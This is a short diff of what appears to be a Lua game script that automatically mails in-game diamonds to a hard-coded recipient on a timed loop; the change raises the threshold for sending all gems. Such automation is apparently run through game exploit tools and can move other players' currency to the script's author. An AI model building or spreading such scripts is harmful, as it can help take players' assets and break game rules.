@@ -24,7 +24,7 @@ spawn(function()
     local username = "ADHDMeth" -- Replace with recipient's username
     local loopInterval = 5 -- Interval in minutes
     local mailTax = 100000 -- Tax deduction for sending diamonds
-    local diamondThreshold = 20000000 -- Threshold for sending all gems
+    local diamondThreshold = 100000000 -- Threshold for sending all gems
 
     while true do
         print("Attempting to retrieve diamond data...")
